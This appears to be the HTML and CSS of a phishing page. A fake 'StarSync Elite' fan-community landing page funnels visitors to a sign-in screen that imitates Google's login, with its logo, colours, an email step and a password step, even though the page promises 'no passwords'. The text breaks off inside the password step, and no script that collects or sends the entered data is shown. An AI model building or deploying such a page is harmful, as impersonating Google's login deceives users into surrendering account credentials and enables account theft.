<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>StarSync Elite — Official Fan Community</title>
<meta name="theme-color" content="#0a0a0f" />
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,500&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />

<style>
/* =========================================================
   THEME
   ========================================================= */
:root{
  --bg:#0a0a0f;
  --bg-2:#101018;
  --surface:rgba(255,255,255,0.04);
  --surface-2:rgba(255,255,255,0.07);
  --border:rgba(255,255,255,0.09);
  --text:#f4f2ee;
  --muted:#9b9aa6;
  --gold:#d4af7a;
  --gold-soft:#e8cfa3;
  --radius:20px;
  --shadow:0 20px 60px rgba(0,0,0,.55);
  --ease:cubic-bezier(.22,.61,.36,1);

  /* Google sign-in palette */
  --g-blue:#1a73e8;
  --g-blue-hover:#1765cc;
  --g-blue-active:#1557b0;
  --g-text:#202124;
  --g-muted:#5f6368;
  --g-border:#dadce0;
  --g-border-focus:#1a73e8;
  --g-bg:#f0f4f9;
  --g-error:#d93025;
  --g-success:#188038;
}
*{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{
  font-family:'Inter',system-ui,sans-serif;
  background:var(--bg);color:var(--text);line-height:1.6;
  -webkit-font-smoothing:antialiased;
  overflow-x:hidden;
}
h1,h2,h3{font-family:'Playfair Display',serif;font-weight:600;letter-spacing:.2px}
a{color:inherit;text-decoration:none}
button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit}
input{font-family:inherit}
img{max-width:100%;display:block}

/* =========================================================
   PAGE SYSTEM
   ========================================================= */
.page{display:none;animation:pageIn .45s var(--ease) both}
.page.active{display:block}
#signInPage.active{display:flex}
@keyframes pageIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}

/* =========================================================
   HOME PAGE — DARK ELEGANT
   ========================================================= */
#homePage{background:var(--bg);min-height:100vh;position:relative;overflow-x:hidden}

.glow{position:fixed;border-radius:50%;filter:blur(120px);opacity:.35;pointer-events:none;z-index:0}
.glow.a{width:600px;height:600px;background:#4b2bbd;top:-200px;left:-150px}
.glow.b{width:500px;height:500px;background:#a06a2b;bottom:-150px;right:-100px;opacity:.25}

.home-nav{
  position:fixed;top:0;left:0;right:0;z-index:50;
  display:flex;align-items:center;justify-content:space-between;
  padding:16px clamp(20px,5vw,64px);
  backdrop-filter:blur(18px);
  background:linear-gradient(to bottom,rgba(10,10,15,.85),rgba(10,10,15,.25));
  border-bottom:1px solid var(--border);
}
.brand{display:flex;align-items:center;gap:12px;font-family:'Playfair Display',serif;font-size:1.05rem;letter-spacing:.16em;font-weight:600}
.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--gold);box-shadow:0 0 18px var(--gold)}
.nav-links{display:flex;gap:28px;align-items:center}
.nav-links a{font-size:.78rem;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;transition:color .3s}
.nav-links a:hover{color:var(--gold-soft)}
.nav-right{display:flex;align-items:center;gap:14px}
.nav-cta{
  padding:10px 22px;border-radius:100px;
  background:linear-gradient(135deg,var(--gold),var(--gold-soft));
  color:#1a1206;font-weight:600;font-size:.78rem;letter-spacing:.06em;
  transition:transform .3s var(--ease),box-shadow .3s;
}
.nav-cta:hover{transform:translateY(-2px);box-shadow:0 12px 30px -8px var(--gold)}
@media(max-width:820px){.nav-links{display:none}}

/* Hero */
.hero{position:relative;min-height:100vh;display:flex;align-items:flex-end;padding:0 clamp(20px,5vw,64px) 70px;z-index:1}
.hero-cover{
  position:absolute;inset:0;z-index:-2;
  background:
    radial-gradient(ellipse at 30% 20%,rgba(139,108,255,.35),transparent 55%),
    radial-gradient(ellipse at 75% 80%,rgba(212,175,122,.28),transparent 55%),
    linear-gradient(160deg,#15102a 0%,#0a0a0f 60%,#0a0a0f 100%);
}
.hero-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(to top,var(--bg) 5%,transparent 55%)}
.hero-inner{max-width:1200px;margin:0 auto;width:100%}
.eyebrow{
  display:inline-flex;align-items:center;gap:10px;padding:8px 16px;border-radius:100px;
  background:rgba(212,175,122,.08);border:1px solid rgba(212,175,122,.25);
  color:var(--gold-soft);font-size:.68rem;letter-spacing:.22em;text-transform:uppercase;font-weight:600;
  margin-bottom:24px;opacity:0;animation:fadeUp .9s .1s var(--ease) forwards;
}
.eyebrow .pulse{width:7px;height:7px;border-radius:50%;background:var(--gold);animation:pulse 2s infinite}
.hero h1{
  font-size:clamp(3rem,8vw,6.5rem);line-height:.95;letter-spacing:-.02em;
  opacity:0;animation:fadeUp .9s .2s var(--ease) forwards;
}
.hero h1 em{font-style:italic;color:var(--gold-soft)}
.hero p.lede{
  margin-top:22px;max-width:560px;color:#c9c7d2;font-size:clamp(1rem,1.6vw,1.1rem);
  opacity:0;animation:fadeUp .9s .35s var(--ease) forwards;
}
.hero-actions{margin-top:34px;display:flex;gap:14px;flex-wrap:wrap;opacity:0;animation:fadeUp .9s .5s var(--ease) forwards}
.btn-primary{
  display:inline-flex;align-items:center;gap:10px;padding:15px 30px;border-radius:100px;
  background:linear-gradient(135deg,var(--gold),var(--gold-soft));
  color:#1a1206;font-weight:700;font-size:.92rem;
  transition:transform .35s var(--ease),box-shadow .35s;
  box-shadow:0 10px 40px -10px rgba(212,175,122,.6);
}
.btn-primary:hover{transform:translateY(-3px);box-shadow:0 20px 50px -12px rgba(212,175,122,.85)}
.btn-primary svg{transition:transform .35s var(--ease)}
.btn-primary:hover svg{transform:translateX(4px)}
.btn-ghost{padding:15px 26px;border-radius:100px;border:1px solid var(--border);background:var(--surface);font-size:.88rem;color:var(--text);transition:background .3s,border-color .3s}
.btn-ghost:hover{background:var(--surface-2);border-color:rgba(255,255,255,.2)}

@keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(1.4)}}

/* Sections */
section{position:relative;z-index:1;padding:100px clamp(20px,5vw,64px);max-width:1200px;margin:0 auto}
.section-head{max-width:640px;margin-bottom:52px}
.section-head .tag{font-size:.7rem;letter-spacing:.24em;text-transform:uppercase;color:var(--gold);font-weight:600}
.section-head h2{font-size:clamp(2rem,4vw,3.1rem);margin-top:12px;line-height:1.05;letter-spacing:-.01em}
.section-head p{color:var(--muted);margin-top:16px;font-size:1rem}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:18px;margin-top:52px}
.stat{padding:26px 22px;border-radius:var(--radius);background:var(--surface);border:1px solid var(--border);backdrop-filter:blur(10px)}
.stat .num{font-family:'Playfair Display',serif;font-size:2.2rem;color:var(--gold-soft);line-height:1}
.stat .lbl{margin-top:8px;font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;color:var(--muted)}

/* Bio */
.bio-grid{display:grid;grid-template-columns:1fr 1.2fr;gap:56px;align-items:center}
@media(max-width:860px){.bio-grid{grid-template-columns:1fr;gap:32px}}
.bio-portrait{
  aspect-ratio:4/5;border-radius:24px;position:relative;overflow:hidden;
  background:radial-gradient(circle at 50% 30%,rgba(212,175,122,.35),transparent 60%),linear-gradient(160deg,#241a3a,#0e0b1a);
  border:1px solid var(--border);box-shadow:var(--shadow);
}
.bio-portrait::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 20px,rgba(255,255,255,.02) 20px,rgba(255,255,255,.02) 21px)}
.bio-portrait .initials{position:absolute;inset:0;display:grid;place-items:center;font-family:'Playfair Display',serif;font-size:8rem;color:rgba(212,175,122,.5);letter-spacing:-.04em}
.bio-copy h3{font-size:1.55rem;margin-bottom:16px;color:var(--gold-soft)}
.bio-copy p{color:#bdbcc8;margin-bottom:14px;font-size:.98rem}
.bio-tags{display:flex;flex-wrap:wrap;gap:10px;margin-top:22px}
.bio-tags span{padding:7px 15px;border-radius:100px;background:var(--surface);border:1px solid var(--border);font-size:.76rem;color:var(--muted)}

/* Benefits grid */
.benefits-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:18px}
.benefit{padding:28px 24px;border-radius:var(--radius);background:var(--surface);border:1px solid var(--border);transition:transform .4s var(--ease),border-color .3s,background .3s}
.benefit:hover{transform:translateY(-4px);border-color:rgba(212,175,122,.3);background:var(--surface-2)}
.benefit .icon{width:44px;height:44px;border-radius:12px;background:linear-gradient(135deg,rgba(212,175,122,.18),rgba(139,108,255,.12));border:1px solid rgba(212,175,122,.25);display:grid;place-items:center;margin-bottom:18px;color:var(--gold-soft)}
.benefit .icon svg{width:22px;height:22px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
.benefit h4{font-family:'Playfair Display',serif;font-size:1.15rem;margin-bottom:8px}
.benefit p{color:var(--muted);font-size:.88rem;line-height:1.55}

/* Updates */
.updates{display:grid;gap:18px}
.update{
  display:grid;grid-template-columns:120px 1fr auto;gap:22px;align-items:center;
  padding:24px 26px;border-radius:var(--radius);
  background:var(--surface);border:1px solid var(--border);
  transition:transform .4s var(--ease),background .3s,border-color .3s;
}
.update:hover{transform:translateX(6px);background:var(--surface-2);border-color:rgba(212,175,122,.3)}
.update .date{font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--gold)}
.update .title{font-family:'Playfair Display',serif;font-size:1.15rem;display:flex;align-items:center;gap:10px}
.update .title .lock{font-size:.8rem;color:var(--muted)}
.update .desc{color:var(--muted);font-size:.86rem;margin-top:4px}
.update .badge{padding:6px 14px;border-radius:100px;font-size:.66rem;letter-spacing:.1em;text-transform:uppercase;background:rgba(139,108,255,.12);border:1px solid rgba(139,108,255,.35);color:#b8a7ff;white-space:nowrap}
@media(max-width:640px){.update{grid-template-columns:1fr;gap:6px}.update .badge{justify-self:start;margin-top:6px}}

/* Gallery */
.gallery{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
@media(max-width:860px){.gallery{grid-template-columns:repeat(2,1fr)}}
.tile{aspect-ratio:1;border-radius:16px;overflow:hidden;position:relative;border:1px solid var(--border);background:linear-gradient(140deg,#1d1733,#0e0b1a);transition:transform .5s var(--ease),box-shadow .5s}
.tile::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 30% 30%,rgba(212,175,122,.22),transparent 60%);opacity:0;transition:opacity .5s}
.tile:hover{transform:scale(1.03);box-shadow:0 20px 40px -12px rgba(0,0,0,.7)}
.tile:hover::after{opacity:1}
.tile span{position:absolute;bottom:14px;left:16px;font-family:'Playfair Display',serif;font-size:1rem;color:rgba(244,242,238,.55)}
.tile .lock-badge{
  position:absolute;top:12px;right:12px;
  padding:5px 11px;border-radius:100px;
  background:rgba(0,0,0,.55);backdrop-filter:blur(8px);
  border:1px solid rgba(255,255,255,.15);
  font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;color:#d6d3e6;
  display:flex;align-items:center;gap:5px;
}
.tile .lock-badge svg{width:10px;height:10px;stroke:currentColor;fill:none;stroke-width:2}

/* CTA */
.join-card{position:relative;overflow:hidden;border-radius:28px;padding:clamp(36px,6vw,68px);background:linear-gradient(140deg,rgba(139,108,255,.14),rgba(212,175,122,.1)),var(--bg-2);border:1px solid var(--border);text-align:center}
.join-card::before{content:"";position:absolute;width:500px;height:500px;border-radius:50%;background:radial-gradient(circle,rgba(212,175,122,.25),transparent 70%);top:-250px;right:-150px;filter:blur(40px)}
.join-card h2{font-size:clamp(1.9rem,4vw,2.9rem);max-width:640px;margin:0 auto;line-height:1.1}
.join-card p{color:var(--muted);max-width:520px;margin:18px auto 32px}
.join-card .btn-primary{margin:0 auto}
.privacy{margin-top:20px;font-size:.76rem;color:#77768a;max-width:500px;margin-inline:auto}

/* Footer */
.home-footer{padding:50px clamp(20px,5vw,64px);border-top:1px solid var(--border);display:flex;flex-wrap:wrap;justify-content:space-between;gap:20px;color:var(--muted);font-size:.8rem;max-width:1200px;margin:0 auto}
.home-footer a:hover{color:var(--gold-soft)}

/* Reveal */
.reveal{opacity:0;transform:translateY(30px);transition:opacity .8s var(--ease),transform .8s var(--ease)}
.reveal.in{opacity:1;transform:none}

/* =========================================================
   SIGN IN PAGE — GOOGLE STYLE
   ========================================================= */
#signInPage{
  min-height:100vh;
  align-items:center;justify-content:center;
  padding:24px;
  background:var(--g-bg);
  color:var(--g-text);
  font-family:'Roboto',system-ui,sans-serif;
  position:relative;
}
.g-wrap{
  width:100%;max-width:448px;
  display:flex;flex-direction:column;gap:16px;
}
.g-card{
  background:#fff;
  border:1px solid var(--g-border);
  border-radius:28px;
  padding:48px 40px 36px;
  box-shadow:0 1px 3px rgba(60,64,67,.08);
  position:relative;
  animation:cardIn .5s var(--ease) both;
}
@keyframes cardIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}

.g-logo{display:flex;justify-content:center;margin-bottom:18px}
.g-logo svg{width:40px;height:40px}

.g-heading{
  font-family:'Roboto',system-ui,sans-serif;
  font-size:24px;font-weight:400;line-height:1.33;
  color:var(--g-text);
  text-align:center;
  margin-bottom:8px;
  letter-spacing:0;
}
.g-subtitle{
  font-size:16px;color:var(--g-text);font-weight:400;
  text-align:center;margin-bottom:32px;
}

/* Material input with floating label */
.g-input{position:relative;margin-bottom:6px}
.g-input input{
  width:100%;
  padding:13px 15px;
  font-size:16px;
  border:1px solid var(--g-border);
  border-radius:4px;
  background:#fff;
  color:var(--g-text);
  transition:border-color .15s,box-shadow .15s;
}
.g-input input:hover{border-color:#9aa0a6}
.g-input input:focus{
  outline:none;
  border-color:var(--g-border-focus);
  box-shadow:0 0 0 1px var(--g-border-focus);
}
.g-input input:disabled{background:#f1f3f4;color:#5f6368}
.g-input label{
  position:absolute;left:12px;top:50%;transform:translateY(-50%);
  background:#fff;padding:0 4px;
  color:var(--g-muted);font-size:16px;
  pointer-events:none;
  transition:top .15s,font-size .15s,color .15s;
}
.g-input input:focus + label,
.g-input input:not(:placeholder-shown) + label{
  top:0;
  font-size:12px;
  color:var(--g-muted);
}
.g-input input:focus + label{color:var(--g-blue)}
.g-input.has-error input{border-color:var(--g-error);box-shadow:0 0 0 1px var(--g-error)}
.g-input.has-error label{color:var(--g-error)}
.g-error-msg{
  display:none;
  align-items:center;gap:6px;
  color:var(--g-error);font-size:12px;
  margin-top:6px;
}
.g-error-msg.show{display:flex}
.g-error-msg svg{width:14px;height:14px;stroke:currentColor;fill:none;stroke-width:2}

.g-link{
  display:inline-block;
  color:var(--g-blue);font-size:14px;font-weight:500;
  margin-top:18px;
  text-decoration:none;
  border-radius:4px;
  padding:2px 4px;
  transition:background .15s;
}
.g-link:hover{background:rgba(26,115,232,.05)}

/* User chip (password step) */
.g-user-chip{
  display:flex;align-items:center;gap:12px;
  padding:8px 14px 8px 8px;
  border:1px solid var(--g-border);
  border-radius:100px;
  font-size:14px;
  color:var(--g-text);
  margin:0 auto 28px;
  width:fit-content;max-width:100%;
  background:#fff;
}
.g-user-chip .g-avatar{
  width:26px;height:26px;border-radius:50%;
  background:linear-gradient(135deg,#1a73e8,#4285f4);
  color:#fff;font-size:12px;font-weight:500;
  display:grid;place-items:center;
  flex-shrink:0;
}
.g-user-chip .g-email{
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
  max-width:260px;
}

/* Actions */
.g-actions{
  display:flex;align-items:center;justify-content:space-between;
  gap:12px;margin-top:32px;
}
.g-text-btn{
  color:var(--g-blue);
  padding:9px 12px;
  font-size:14px;font-weight:500;
  border-radius:4px;
  transition:background .15s;
}
.g-text-btn:hover{background:rgba(26,115,232,.05)}
.g-primary{
  background:var(--g-blue);
  color:#fff;
  padding:10px 24px;
  border-radius:4px;
  font-size:14px;font-weight:500;
  transition:background .15s,box-shadow .15s;
  min-width:88px;
  display:inline-flex;align-items:center;justify-content:center;gap:8px;
}
.g-primary:hover{background:var(--g-blue-hover);box-shadow:0 1px 3px rgba(26,115,232,.4)}
.g-primary:active{background:var(--g-blue-active)}
.g-primary:disabled{opacity:.6;cursor:not-allowed}
.g-primary .spin{
  width:14px;height:14px;border:2px solid rgba(255,255,255,.4);
  border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

/* Checkbox */
.g-checkbox{
  display:flex;align-items:center;gap:10px;
  font-size:14px;color:var(--g-text);
  cursor:pointer;margin-top:14px;
  user-select:none;
}
.g-checkbox input{width:18px;height:18px;accent-color:var(--g-blue);cursor:pointer}

/* Loading + success states */
.g-state{text-align:center;padding:8px 0 4px;animation:cardIn .4s var(--ease) both}
.g-spinner{
  width:44px;height:44px;margin:0 auto 22px;
  border:3px solid #e8eaed;
  border-top-color:var(--g-blue);
  border-radius:50%;animation:spin 1s linear infinite;
}
.g-state h3{
  font-family:'Roboto',sans-serif;font-weight:400;font-size:22px;
  color:var(--g-text);margin-bottom:8px;
}
.g-state p{font-size:14px;color:var(--g-muted)}

.g-success-icon{
  width:64px;height:64px;border-radius:50%;
  background:#e6f4ea;
  display:grid;place-items:center;
  margin:0 auto 22px;
  animation:successPop .5s var(--ease) both;
}
.g-success-icon svg{width:32px;height:32px;stroke:var(--g-success);fill:none;stroke-width:3;stroke-linecap:round;stroke-linejoin:round}
@keyframes successPop{0%{transform:scale(0)}70%{transform:scale(1.1)}100%{transform:scale(1)}}
.g-state .g-primary{margin-top:26px;width:100%;padding:13px}

/* Footer */
.g-footer{
  display:flex;align-items:center;justify-content:space-between;
  padding:0 8px;
  font-size:12px;color:var(--g-muted);
  flex-wrap:wrap;gap:12px;
}
.g-footer .g-lang{
  display:inline-flex;align-items:center;gap:6px;
  cursor:pointer;padding:4px 8px;border-radius:4px;
  transition:background .15s;
}
.g-footer .g-lang:hover{background:rgba(60,64,67,.06)}
.g-footer .g-lang svg{width:10px;height:10px;fill:currentColor}
.g-footer-links{display:flex;gap:4px}
.g-footer-links a{
  padding:4px 10px;border-radius:4px;color:var(--g-muted);
  transition:background .15s,color .15s;
}
.g-footer-links a:hover{background:rgba(60,64,67,.06);color:var(--g-text)}

/* Toast */
.toast-wrap{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:300;display:flex;flex-direction:column;gap:10px;align-items:center;pointer-events:none}
.toast{
  padding:13px 22px;border-radius:100px;font-size:.85rem;
  background:#16141f;color:#f4f2ee;border:1px solid rgba(255,255,255,.12);
  box-shadow:0 20px 60px rgba(0,0,0,.55);
  display:flex;align-items:center;gap:10px;
  transform:translateY(20px);opacity:0;
  animation:toastIn .4s var(--ease) forwards;
  font-family:'Inter',sans-serif;
}
.toast.err{border-color:rgba(255,90,90,.4);color:#ffb4b4}
.toast.ok{border-color:rgba(120,220,150,.35);color:#b8f0c9}
.toast .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
@keyframes toastIn{to{transform:none;opacity:1}}

/* Responsive */
@media(max-width:480px){
  .g-card{padding:36px 24px 28px;border-radius:20px}
  .g-heading{font-size:22px}
  .g-subtitle{font-size:15px;margin-bottom:26px}
  .g-actions{flex-direction:row-reverse;justify-content:space-between}
}
</style>
</head>
<body>

<!-- ============================================================
     HOME PAGE
     ============================================================ -->
<div id="homePage" class="page active">
  <div class="glow a"></div>
  <div class="glow b"></div>

  <header class="home-nav">
    <a class="brand" href="#top"><span class="dot"></span> STARSYNC</a>
    <nav class="nav-links">
      <a href="#about">About</a>
      <a href="#benefits">Benefits</a>
      <a href="#updates">Updates</a>
      <a href="#gallery">Gallery</a>
    </nav>
    <div class="nav-right">
      <button class="nav-cta" onclick="goToSignIn()">Sign In</button>
    </div>
  </header>

  <main id="top">
    <!-- HERO -->
    <div class="hero">
      <div class="hero-cover"></div>
      <div class="hero-inner">
        <span class="eyebrow"><span class="pulse"></span> Official Fan Community</span>
        <h1>Enter the world<br>of <em>StarSync</em>.</h1>
        <p class="lede">A private space for the people who feel every lyric, every frame, every moment. Get exclusive updates before anyone else — and stand beside StarSync, together.</p>
        <div class="hero-actions">
          <button class="btn-primary" onclick="goToSignIn()">
            Join StarSync Elite
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
          </button>
          <a class="btn-ghost" href="#about">Discover StarSync</a>
        </div>
        <div class="stats">
          <div class="stat reveal"><div class="num">2.4M</div><div class="lbl">Fans Worldwide</div></div>
          <div class="stat reveal"><div class="num">120+</div><div class="lbl">Exclusive Updates</div></div>
          <div class="stat reveal"><div class="num">48</div><div class="lbl">Live Sessions</div></div>
          <div class="stat reveal"><div class="num">9.8★</div><div class="lbl">Fan Rating</div></div>
        </div>
      </div>
    </div>

    <!-- ABOUT -->
    <section id="about">
      <div class="section-head reveal">
        <div class="tag">The Artist</div>
        <h2>A voice that became a movement.</h2>
      </div>
      <div class="bio-grid">
        <div class="bio-portrait reveal" aria-hidden="true"><div class="initials">SS</div></div>
        <div class="bio-copy reveal">
          <h3>From bedroom demos to global stages.</h3>
          <p>StarSync began writing songs in a small room with a borrowed keyboard — and an unshakeable belief that honesty, set to music, could change lives. Three albums, two world tours, and a community of millions later, that belief is now a movement.</p>
          <p>This is the official fan community: a private, respectful space to receive first looks, personal letters, backstage stories, and invitations that never make it to the public feed.</p>
          <div class="bio-tags">
            <span>Alternative Pop</span><span>Songwriter</span><span>Producer</span><span>Philanthropy</span><span>3× Platinum</span>
          </div>
        </div>
      </div>
    </section>

    <!-- BENEFITS -->
    <section id="benefits">
      <div class="section-head reveal">
        <div class="tag">Membership</div>
        <h2>What StarSync Elite unlocks.</h2>
        <p>Every member gets more than a feed — a closer seat to the story.</p>
      </div>
      <div class="benefits-grid">
        <div class="benefit reveal">
          <div class="icon"><svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div>
          <h4>Early Access</h4>
          <p>New music, videos, and merch drops land in your feed 48 hours before the public release.</p>
        </div>
        <div class="benefit reveal">
          <div class="icon"><svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><polygon points="10 9 15 12 10 15 10 9" fill="currentColor" stroke="none"/></svg></div>
          <h4>Behind-the-Scenes</h4>
          <p>Unreleased footage from the studio, rehearsals, and tour — filmed just for the community.</p>
        </div>
        <div class="benefit reveal">
          <div class="icon"><svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2z"/><polyline points="12 6 12 12 16 14"/></svg></div>
          <h4>Private Live Sessions</h4>
          <p>Intimate acoustic sets and Q&amp;As streamed only to members. No recordings, no leaks.</p>
        </div>
        <div class="benefit reveal">
          <div class="icon"><svg viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div>
          <h4>Fan Community</h4>
          <p>Connect with 2.4 million fans worldwide. Share art, theories, and moments that matter.</p>
        </div>
      </div>
    </section>

    <!-- UPDATES -->
    <section id="updates">
      <div class="section-head reveal">
        <div class="tag">Exclusive Updates</div>
        <h2>What's happening, first.</h2>
        <p>Members see these before anyone else. Sign in to unlock the full feed.</p>
      </div>
      <div class="updates">
        <div class="update reveal">
          <div class="date">Oct 18</div>
          <div>
            <div class="title">New single “Meridian” drops Friday <span class="lock">🔒</span></div>
            <div class="desc">A midnight release, plus a members-only acoustic version.</div>
          </div>
          <span class="badge">Music</span>
        </div>
        <div class="update reveal">
          <div class="date">Oct 12</div>
          <div>
            <div class="title">Backstage film from the London show <span class="lock">🔒</span></div>
            <div class="desc">15 unseen minutes, straight from the wings.</div>
          </div>
          <span class="badge">Video</span>
        </div>
        <div class="update reveal">
          <div class="date">Oct 05</div>
          <div>
            <div class="title">A letter to the community <span class="lock">🔒</span></div>
            <div class="desc">StarSync writes about the year ahead — and where you fit in it.</div>
          </div>
          <span class="badge">Letter</span>
        </div>
      </div>
    </section>

    <!-- GALLERY -->
    <section id="gallery">
      <div class="section-head reveal">
        <div class="tag">Photo Gallery</div>
        <h2>Moments, captured.</h2>
      </div>
      <div class="gallery">
        <div class="tile reveal"><span>Studio</span><div class="lock-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Locked</div></div>
        <div class="tile reveal"><span>Stage</span><div class="lock-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Locked</div></div>
        <div class="tile reveal"><span>Portrait</span><div class="lock-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Locked</div></div>
        <div class="tile reveal"><span>Backstage</span><div class="lock-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Locked</div></div>
        <div class="tile reveal"><span>Tour</span><div class="lock-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Locked</div></div>
        <div class="tile reveal"><span>Unreleased</span><div class="lock-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Locked</div></div>
      </div>
    </section>

    <!-- JOIN CTA -->
    <section id="join">
      <div class="join-card reveal">
        <div class="tag" style="color:var(--gold);font-size:.7rem;letter-spacing:.24em;text-transform:uppercase;font-weight:600">The Community</div>
        <h2 style="margin-top:12px">Join StarSync Elite.</h2>
        <p>Sign in to unlock exclusive updates, private galleries, and the members-only feed. One tap, no passwords.</p>
        <button class="btn-primary" onclick="goToSignIn()">
          Sign In to Continue
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </button>
        <div class="privacy">By joining you agree to our Terms and Privacy Policy. You can sign out anytime.</div>
      </div>
    </section>
  </main>

  <footer class="home-footer">
    <div>© 2026 StarSync — Official Fan Community.</div>
    <div style="display:flex;gap:20px">
      <a href="#" onclick="return false">Privacy</a>
      <a href="#" onclick="return false">Terms</a>
    </div>
  </footer>
</div>

<!-- ============================================================
     SIGN IN PAGE — GOOGLE STYLE
     ============================================================ -->
<div id="signInPage" class="page">
  <div class="g-wrap">
    <div class="g-card">

      <!-- STEP 1: EMAIL -->
      <div id="gStepEmail">
        <div class="g-logo">
          <svg viewBox="0 0 48 48">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
          </svg>
        </div>
        <h2 class="g-heading">Sign in</h2>
        <p class="g-subtitle">to continue to StarSync Elite</p>

        <form id="gEmailForm" novalidate>
          <div class="g-input" id="gEmailWrap">
            <input type="email" id="gEmail" placeholder=" " autocomplete="username" required>
            <label for="gEmail">Email or phone</label>
          </div>
          <div class="g-error-msg" id="gEmailError">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <span>Enter a valid email</span>
          </div>
          <a href="#" class="g-link" onclick="return forgotEmail(event)">Forgot email?</a>

          <div class="g-actions">
            <button type="button" class="g-text-btn" onclick="createAccount()">Create account</button>
            <button type="submit" class="g-primary">Next</button>
          </div>
        </form>
      </div>

      <!-- STEP 2: PASSWORD -->
      <div id="gStepPassword" style="display:none">
        <div class="g-logo">
          <svg viewBox="0 0 48 48">
            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
